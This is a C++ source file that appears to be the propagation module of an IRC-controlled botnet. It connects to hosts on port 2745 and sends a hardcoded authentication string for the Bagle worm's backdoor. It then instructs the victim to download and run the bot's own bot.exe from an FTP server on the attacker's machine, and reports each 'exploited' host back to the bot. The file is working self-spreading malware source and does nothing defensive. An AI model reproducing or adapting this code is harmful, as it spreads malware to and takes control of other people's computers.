/*$T baglescanner.cpp GC 1.138 03/15/04 03:20:05 */


/*$6
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 */


#include "main.h"
#include "mainctrl.h"
#include "utility.h"

class CScannerBagle :
	public CScannerBase
{
/*
 -----------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------
 */
public:
	CScannerBagle(void);
	virtual ~CScannerBagle()
	throw()
	{
	}
	bool	Exploit(void);
};

#define BAGLE_DEFAULT_PORT	2745

/*
 * Bagle.C : 3E7506B1 Bagle.E : 3E7506B1 Bagle.F : 9C0209C4 Bagle.G : 9C0209C4
 * Bagle.H : 9C0209C4 Bagle.J : 9C0209C4 Bagle.K : 9C0209C4 £
 */

/*
 * OLD, if someone thinks we should still send for the old version(that has timed out)
 * do it, I'm too lazy and I doubt there is much point [thegeek] 
 */

//char    bagle_auth1[] = "\x43\xFF\xFF\xFF\x30\x30\x30\x01\x0A\x1F\x2B\x28\x2B\xA1\x32\x01";
char	bagle_auth2[] = "\x43\xFF\xFF\xFF\x30\x30\x30\x01\x0A\x28\x91\xA1\x2B\xE6\x60\x2F\x32\x8F\x60\x15\x1A\x20\x1A";
char	spreadurl[] = "URL";

/*
 =======================================================================================================================
 =======================================================================================================================
 */

CScannerBagle::CScannerBagle(void)
{
	m_szType = "CScannerBagle";
	m_sScannerName.Assign("Bagle");
}

/*
 =======================================================================================================================
 =======================================================================================================================
 */
bool CScannerBagle::Exploit(void)
{
	/*~~~~~~~~~~~~~~~~~~~*/
	char	szRecvBuf[128];
	/*~~~~~~~~~~~~~~~~~~~*/

	if(!m_sSocket.Connect(m_sSocket.m_szHost, BAGLE_DEFAULT_PORT))	/* Connect failed, exit */
	{
		return false;
	}

	if(g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: Scanning %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	if(!m_sSocket.Write(bagle_auth2, sizeof(bagle_auth2)))
	{
		m_sSocket.Disconnect();
		return false;
	}

	if(!m_sSocket.RecvTO(szRecvBuf, 8, 5000))
	{
		m_sSocket.Disconnect();
		return false;
	}

	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	int		iPort = g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;
	CString sSpreadURL;
	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

	sSpreadURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), iPort);

	/* Send the url to download file from, use built in ftp. */
	if(!m_sSocket.Write(sSpreadURL.CStr(), sSpreadURL.GetLength() + 1))
	{
		m_sSocket.Disconnect();
		return false;
	}

	Sleep(1000);

	if(g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	m_sSocket.Disconnect();

	return true;
}

REGSCANNER(Bagle_2745, Bagle, 2745, true, true)
